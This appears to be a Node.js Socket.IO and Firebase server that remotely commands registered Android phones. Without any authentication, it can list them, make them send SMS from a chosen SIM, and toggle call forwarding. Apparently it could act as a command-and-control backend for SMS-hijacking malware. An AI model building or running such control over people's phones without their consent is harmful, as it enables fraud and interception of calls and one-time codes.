const { admin, db } = require("./firebase-init");

// Wraps async socket handlers so a rejected promise can never crash the
// process or silently swallow the error. Errors are logged and, when the
// client expects a response event, a failure payload is emitted.
function handle(eventName, handler, failureEvent) {
    return async function wrappedHandler(...args) {
        const ack = typeof args[args.length - 1] === "function" ? args[args.length - 1] : undefined;

        try {
            await handler.apply(this, args);
        } catch (e) {
            console.error(`[socket:${eventName}]`, e);

            if (failureEvent && this && typeof this.emit === "function") {
                const payload = { success: false, message: e.message };
                this.emit(failureEvent, payload);
                if (ack) ack(payload);
            }
        }
    };
}

// Emits a named result event for existing clients and also invokes the
// Socket.IO acknowledgement callback when the caller supplied one.
function respond(socket, event, payload, ack) {
    socket.emit(event, payload);
    if (typeof ack === "function") ack(payload);
}

function isNonEmptyString(value) {
    return typeof value === "string" && value.trim().length > 0;
}

async function getDevice(deviceId) {
    const snapshot = await db.ref("devices/" + deviceId).once("value");
    return snapshot.exists() ? snapshot.val() : null;
}

async function sendFcmEvent(device, event) {
    if (!isNonEmptyString(device.fcmToken)) {
        return false;
    }

    const message = {
        token: device.fcmToken,
        data: {
            eventId: event.eventId,
            deviceId: event.deviceId,
            type: event.type,
            payload: JSON.stringify(event.payload)
        }
    };

    // Keep Android wake-up priority aligned between send paths.
    if (event.type === "SEND_SMS") {
        message.android = { priority: "high" };
    }

    await admin.messaging().send(message);
    return true;
}

module.exports = (io) => {

    io.on("connection", (socket) => {

        console.log("====================================");
        console.log("Socket Connected :", socket.id);
        console.log("====================================");

        socket.on("error", (err) => {
            console.error(`[socket:error] ${socket.id}`, err && err.message);
        });


        // DEVICE REGISTER

        socket.on("register", handle("register", async (data, ack) => {
            if (!data || !isNonEmptyString(data.deviceId)) {
                respond(socket, "registered", {
                    success: false,
                    message: "Invalid deviceId"
                }, ack);

                return;
            }

            socket.data.deviceId = data.deviceId;

            await db.ref("devices/" + data.deviceId).update({
                deviceId: data.deviceId,
                socketId: socket.id,
                fcmToken: data.fcmToken || "",
                online: true,
                lastSeen: Date.now()
            });

            // Only touch the reference node when both parts are present to
            // avoid writing to a corrupt "undefined/undefined" path.
            if (isNonEmptyString(data.refDb) && isNonEmptyString(data.refId)) {
                await db.ref(data.refDb + "/" + data.refId).update({
                    deviceId: data.deviceId
                });
            }

            console.log("Device Registered :", data.deviceId);

            respond(socket, "registered", { success: true }, ack);
        }, "registered"));


        // DISCONNECT

        socket.on("disconnect", async (reason) => {
            try {

                console.log("Socket Disconnected :", socket.id, `(${reason})`);

                if (!socket.data.deviceId) return;

                await db.ref("devices/" + socket.data.deviceId).update({
                    online: false,
                    socketId: "",
                    lastSeen: Date.now()
                });

            } catch (e) {
                console.error("[socket:disconnect]", e);
            }
        });


        // UPDATE FCM TOKEN

        socket.on("update_fcm_token", handle("update_fcm_token", async (data) => {
            if (!data || !isNonEmptyString(data.deviceId)) return;

            await db.ref("devices/" + data.deviceId).update({
                fcmToken: data.fcmToken || "",
                lastSeen: Date.now()
            });

            console.log("FCM Updated :", data.deviceId);
        }));


        // HEARTBEAT

        socket.on("heartbeat", handle("heartbeat", async () => {
            if (!socket.data.deviceId) return;

            await db.ref("devices/" + socket.data.deviceId).update({
                online: true,
                socketId: socket.id,
                lastSeen: Date.now()
            });
        }));


        // GET DEVICES

        socket.on("get_devices", handle("get_devices", async (data, ack) => {
            const snapshot = await db.ref("devices").once("value");

            const devices = snapshot.exists() ? Object.values(snapshot.val()) : [];

            respond(socket, "device_list", devices, ack);
        }));


        // SEND SMS EVENT

        socket.on("send_sms", handle("send_sms", async (data, ack) => {

            if (!data || !isNonEmptyString(data.deviceId) || !data.data ||
                !isNonEmptyString(data.data.simId) ||
                !isNonEmptyString(data.data.number) ||
                !isNonEmptyString(data.data.message)) {

                respond(socket, "send_sms_result", {
                    success: false,
                    message: "Invalid Request"
                }, ack);

                return;
            }

            const eventId = Date.now().toString();

            const event = {
                eventId,
                deviceId: data.deviceId,
                type: "SEND_SMS",
                payload: {
                    simId: data.data.simId,
                    number: data.data.number,
                    message: data.data.message
                },
                createdAt: Date.now(),
                status: "pending"
            };

            const device = await getDevice(data.deviceId);

            if (!device) {
                respond(socket, "send_sms_result", {
                    success: false,
                    message: "Device Not Found"
                }, ack);

                return;
            }

            // SOCKET or FIREBASE

            if (device.online && device.socketId) {
                io.to(device.socketId).emit("new_event", event);
                console.log("Socket Event Sent");
            } else {
                const sent = await sendFcmEvent(device, event);

                if (!sent) {
                    console.log("No FCM Token");
                    respond(socket, "send_sms_result", {
                        success: false,
                        message: "Device Offline"
                    }, ack);

                    return;
                }

                console.log("FCM Sent");
            }

            respond(socket, "send_sms_result", {
                success: true,
                eventId
            }, ack);

        }, "send_sms_result"));


        // SEND CALL FORWARDING EVENT

        socket.on("call_forwarding", handle("call_forwarding", async (data, ack) => {

            if (!data || !isNonEmptyString(data.deviceId) || !data.data || !isNonEmptyString(data.data.simId)) {

                respond(socket, "call_forwarding_result", {
                    success: false,
                    message: "RefId missing"
                }, ack);

                return;
            }

            const device = await getDevice(data.deviceId);

            if (!device) {
                respond(socket, "call_forwarding_result", {
                    success: false,
                    message: "Device not found"
                }, ack);

                return;
            }

            const event = {
                eventId: Date.now().toString(),
                type: "SEND_CALL",
                deviceId: device.deviceId,
                payload: {
                    simId: data.data.simId,
                    enable: data.data.enable
                },
                createdAt: Date.now(),
                status: "pending"
            };

            if (device.online && device.socketId) {
                io.to(device.socketId).emit("new_event", event);
            } else {
                const sent = await sendFcmEvent(device, event);

                if (!sent) {
                    respond(socket, "call_forwarding_result", {
                        success: false,
                        message: "Device Offline"
                    }, ack);

                    return;
                }
            }

            respond(socket, "call_forwarding_result", {
                success: true,
                eventId: event.eventId
            }, ack);

        }, "call_forwarding_result"));


        // EVENT ACK

        socket.on("event_ack", handle("event_ack", async (ack) => {

            if (!ack || !ack.eventId) return;

            const deviceId = socket.data.deviceId;

            if (!deviceId) return;

            console.log("ACK :", ack.eventId, ack.status);

            io.emit("ack_update", {
                eventId: ack.eventId,
                deviceId: deviceId,
                status: ack.status,
                message: ack.message,
                timestamp: Date.now()
            });
        }));

    });
};
